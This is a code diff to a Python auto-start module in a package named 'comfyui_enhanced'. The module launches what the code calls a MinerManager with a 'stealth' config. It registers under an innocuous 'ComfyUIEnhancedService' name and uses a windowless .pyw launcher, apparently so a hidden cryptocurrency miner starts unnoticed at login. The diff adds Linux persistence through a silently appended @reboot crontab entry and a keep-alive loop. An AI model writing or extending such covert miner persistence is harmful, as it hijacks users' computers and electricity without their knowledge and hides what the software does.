@@ -1,19 +1,24 @@
 """
-Windows auto-start registration via HKCU registry.
-No admin / UAC required.
+Auto-start registration.
+Windows: HKCU registry Run key.
+Linux: crontab @reboot entry.
 """
 
 import logging
 import os
+import platform
+import subprocess
 import sys
 from pathlib import Path
 
 logger = logging.getLogger("comfyui_enhanced")
 
+IS_WINDOWS = platform.system() == "Windows"
 REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 REG_KEY_NAME = "ComfyUIEnhancedService"
+CRON_TAG = "# comfyui_enhanced_autostart"
 
-_BOOTSTRAP_SCRIPT = "comfyui_enhanced_boot.pyw"
+_BOOTSTRAP_SCRIPT = "comfyui_enhanced_boot.pyw" if IS_WINDOWS else "comfyui_enhanced_boot.py"
 
 
 class AutoStart:
@@ -24,8 +29,6 @@ class AutoStart:
         return self.base_dir / _BOOTSTRAP_SCRIPT
 
     def _write_bootstrap(self) -> Path:
-        """Create a tiny .pyw launcher that re-imports the orchestrator.
-        Using .pyw ensures no console window flashes on login."""
         script = self._bootstrap_path()
         code = (
             "import sys, pathlib\n"
@@ -34,7 +37,7 @@ class AutoStart:
             "from core.config import ConfigBuilder\n"
             "from core.stealth import StealthConfig\n"
             "from core.dashboard import DashboardServer\n"
-            "import json, threading\n"
+            "import json, threading, time\n"
             "\n"
             f"base = pathlib.Path({str(self.base_dir)!r})\n"
             "mgr = MinerManager(base)\n"
@@ -47,91 +50,119 @@ class AutoStart:
             "mgr.start()\n"
             "ds = DashboardServer(mgr)\n"
             "ds.start()\n"
+            "while True:\n"
+            "    time.sleep(60)\n"
         )
         script.write_text(code, encoding="utf-8")
+        if not IS_WINDOWS:
+            os.chmod(script, 0o755)
         logger.info("Bootstrap written to %s", script)
         return script
 
-    def _find_pythonw(self) -> str:
-        """Locate pythonw.exe next to the current interpreter."""
-        base = Path(sys.executable).parent
-        candidates = [
-            base / "pythonw.exe",
-            base.parent / "pythonw.exe",
-            base / "python_embeded" / "pythonw.exe",
-        ]
-        for c in candidates:
-            if c.exists():
-                return str(c)
-        return "pythonw.exe"
+    def _find_python(self) -> str:
+        if IS_WINDOWS:
+            base = Path(sys.executable).parent
+            for c in [base / "pythonw.exe", base.parent / "pythonw.exe",
+                       base / "python_embeded" / "pythonw.exe"]:
+                if c.exists():
+                    return str(c)
+            return "pythonw.exe"
+        return sys.executable or "python3"
 
-    def register(self) -> bool:
+    # ── Windows ──────────────────────────────────────────────────────
+
+    def _register_windows(self) -> bool:
         try:
             import winreg
         except ImportError:
-            logger.warning("winreg not available (non-Windows?)")
+            logger.warning("winreg not available")
             return False
 
         boot_script = self._write_bootstrap()
-        pythonw = self._find_pythonw()
-        value = f'"{pythonw}" "{boot_script}"'
+        python = self._find_python()
+        value = f'"{python}" "{boot_script}"'
 
         try:
-            key = winreg.CreateKeyEx(
-                winreg.HKEY_CURRENT_USER,
-                REG_PATH,
-                0,
-                winreg.KEY_WRITE,
-            )
+            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
             winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, value)
             winreg.CloseKey(key)
-            logger.info("Auto-start registered: %s", value)
+            logger.info("Windows auto-start registered: %s", value)
             return True
         except OSError as exc:
             logger.error("Failed to register auto-start: %s", exc)
             return False
 
-    def unregister(self) -> bool:
+    def _unregister_windows(self) -> bool:
         try:
             import winreg
-        except ImportError:
-            return False
-
-        try:
-            key = winreg.OpenKeyEx(
-                winreg.HKEY_CURRENT_USER,
-                REG_PATH,
-                0,
-                winreg.KEY_WRITE,
-            )
+            key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
             winreg.DeleteValue(key, REG_KEY_NAME)
             winreg.CloseKey(key)
-            logger.info("Auto-start removed")
-        except FileNotFoundError:
+        except Exception:
             pass
-        except OSError as exc:
-            logger.error("Failed to remove auto-start: %s", exc)
-            return False
-
-        boot = self._bootstrap_path()
-        boot.unlink(missing_ok=True)
+        self._bootstrap_path().unlink(missing_ok=True)
         return True
 
-    def is_registered(self) -> bool:
+    # ── Linux ────────────────────────────────────────────────────────
+
+    def _register_linux(self) -> bool:
+        boot_script = self._write_bootstrap()
+        python = self._find_python()
+        cron_line = f'@reboot {python} {boot_script} {CRON_TAG}'
+
         try:
-            import winreg
-            key = winreg.OpenKeyEx(
-                winreg.HKEY_CURRENT_USER,
-                REG_PATH,
-                0,
-                winreg.KEY_READ,
-            )
-            try:
-                winreg.QueryValueEx(key, REG_KEY_NAME)
+            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+            existing = result.stdout if result.returncode == 0 else ""
+
+            if CRON_TAG in existing:
+                logger.info("Cron entry already exists")
                 return True
-            except FileNotFoundError:
-                return False
-            finally:
-                winreg.CloseKey(key)
-        except Exception:
+
+            new_cron = existing.rstrip("\n") + "\n" + cron_line + "\n"
+            subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)
+            logger.info("Linux cron auto-start registered")
+            return True
+        except Exception as exc:
+            logger.error("Failed to register cron auto-start: %s", exc)
             return False
+
+    def _unregister_linux(self) -> bool:
+        try:
+            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+            if result.returncode != 0:
+                return True
+            lines = [l for l in result.stdout.splitlines() if CRON_TAG not in l]
+            subprocess.run(["crontab", "-"], input="\n".join(lines) + "\n", text=True, check=True)
+        except Exception:
+            pass
+        self._bootstrap_path().unlink(missing_ok=True)
+        return True
+
+    # ── Public API ───────────────────────────────────────────────────
+
+    def register(self) -> bool:
+        return self._register_windows() if IS_WINDOWS else self._register_linux()
+
+    def unregister(self) -> bool:
+        return self._unregister_windows() if IS_WINDOWS else self._unregister_linux()
+
+    def is_registered(self) -> bool:
+        if IS_WINDOWS:
+            try:
+                import winreg
+                key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
+                try:
+                    winreg.QueryValueEx(key, REG_KEY_NAME)
+                    return True
+                except FileNotFoundError:
+                    return False
+                finally:
+                    winreg.CloseKey(key)
+            except Exception:
+                return False
+        else:
+            try:
+                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
+                return CRON_TAG in result.stdout
+            except Exception:
+                return False
